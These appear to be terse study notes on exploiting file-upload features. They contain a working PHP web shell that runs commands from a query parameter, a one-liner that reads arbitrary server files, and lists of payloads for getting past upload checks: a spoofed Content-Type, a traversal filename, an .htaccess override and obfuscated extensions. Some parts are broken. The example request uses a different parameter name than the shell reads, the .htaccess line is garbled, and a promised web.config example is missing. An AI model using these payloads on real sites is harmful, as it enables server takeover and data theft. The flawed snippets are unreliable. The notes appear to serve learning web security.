A more versatile web shell may look something like this:
```php
<?php echo system($_GET['cmd']); ?>
```

This script enables you to pass an arbitrary system command via a query parameter as follows: `GET /example/exploit.php?command=id HTTP/1.1`
The following PHP one-liner could be used to read arbitrary files from the server's filesystem: `<?php echo file_get_contents('/path/to/target/file'); ?>`
### Flawed file type validation
One way that websites may attempt to validate file uploads is to check that this input-specific `Content-Type` header matches an expected MIME type. If the server is only expecting image files, for example, it may only allow types like `image/jpeg` and `image/png`. Problems can arise when the value of this header is implicitly trusted by the server.
`Content-Type: application/x-php -> Content-Type: image/png`
### Preventing file execution in user-accessible directories
Web servers often use the `filename` field in `multipart/form-data` requests to determine the name and location where the file should be saved.
`Content-Disposition: form-data; name="avatar"; `**filename="exploit.php"**  ->
`Content-Disposition: form-data; name="avatar"; `**filename="..%2Fexploit.php"**
#### Overriding the server configuration
Many servers also allow developers to create special configuration files within individual directories in order to override or add to one or more of the global settings. Apache servers, for example, will load a directory-specific configuration from a file called `.htaccess` if one is present.
PHP files will be processed as another type of file, bypassing the blacklist.
`.htaccess` -> AddType application/x-httpd-php .htaccessAddtype
Similarly, developers can make directory-specific configuration on IIS servers using a `web.config` file. This might include directives such as the following, which in this case allows JSON files to be served to users:
#### Obfuscating file extensions
`exploit.pHp`
`exploit.php.jpg`
`exploit.php.`
`exploit%2Ephp` --URL encoding
`exploit.asp;.jpg` or `exploit.asp%00.jpg` --Semicolons or URL-encoded null byte characters
`exploit.p.phphp`
### Flawed validation of the file's contents
JPG files always begin with the bytes `FF D8 FF`
- _magic bytes or magic numbers_
Using special tools, such as ExifTool, it can be trivial to create a polyglot JPEG file containing malicious code within its metadata.
